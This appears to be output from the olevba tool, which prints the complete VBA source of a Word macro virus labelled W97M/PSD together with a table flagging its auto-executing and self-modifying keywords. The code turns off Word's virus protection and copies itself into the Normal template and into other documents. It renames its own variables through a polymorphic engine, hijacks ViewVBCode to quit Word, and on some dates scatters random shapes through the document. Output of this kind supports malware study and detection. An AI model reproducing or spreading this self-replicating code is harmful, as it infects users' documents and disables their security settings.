olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-3a777529f1c5c4a765319347bdd50aec0363e741
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-3a777529f1c5c4a765319347bdd50aec0363e741 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For BT5296 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next BT5296: End If
NE8025 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
RL4556 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set UD8870 = ActiveDocument.VBProject.VBComponents.Item(1)
GT214 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set UD8870 = NormalTemplate.VBProject.VBComponents.Item(1)
BM5454 = True
Call PJ1653_BN7826
ActiveDocument.Saved = True
End If
If BM5454 <> True And GT214 <> True Then GoTo HJ9557
If BM5454 = True Then UD8870.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NE8025 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If GT214 = True Then UD8870.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RL4556 - 4))
HJ9557:
If RL4556 <> 0 And NE8025 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function PJ1653_BN7826()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "IN8974": r1(2) = "PD8319": r1(3) = "RT482": r1(4) = "IR3399": r1(5) = "BN7826": r1(6) = "NE8025"
r1(7) = "RL4556": r1(8) = "GT214":: r1(9) = "UD8870": r1(10) = "BM5454": r1(11) = "HJ9557": r1(12) = "PJ1653": r1(13) = "HV455": r1(14) = "MR4589": r1(15) = "BT5296"
For BT5296 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call BN7826(a1, r1(BT5296))
Next BT5296
End Function 'VAMP v1.0 [thanks Vic!]
Private Function BN7826(MR4589, HV455 As String)
On Error Resume Next
Dim IN8974 As Long: Dim PD8319 As Long: Dim RT482 As Long: Dim IR3399 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
IN8974 = 1: PD8319 = 1: RT482 = .CountOfLines: IR3399 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HV455, IN8974, PD8319, RT482, IR3399, True)
strline = .Lines(IN8974, 1)
strline = Left(strline, PD8319 - 1) & MR4589 & Mid(strline, IR3399)
.replaceline IN8974, strline
IN8974 = RT482 + 1: PD8319 = 1:
RT482 = .CountOfLines
IR3399 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

